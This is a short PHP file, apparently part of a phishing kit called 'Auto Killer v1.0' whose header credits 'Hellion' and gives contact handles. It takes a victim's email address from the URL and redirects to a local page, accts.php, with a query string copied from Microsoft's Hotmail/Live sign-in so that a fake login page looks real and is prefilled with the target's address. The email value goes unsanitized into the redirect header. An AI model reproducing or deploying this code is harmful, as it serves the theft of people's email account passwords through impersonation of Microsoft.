<?php

  /*
 
 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : team_pbg@yahoo.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # WARNING: Do not touch anything here!
 
  */
  
$email = $_GET['email'];
header("location: accts.php?login.srf?wa=wsignin1.0&rpsnv=12&ct=1425083828&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=httpsbay169.mail.live.com%default.aspxFrru3inbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai&email=$email");

?>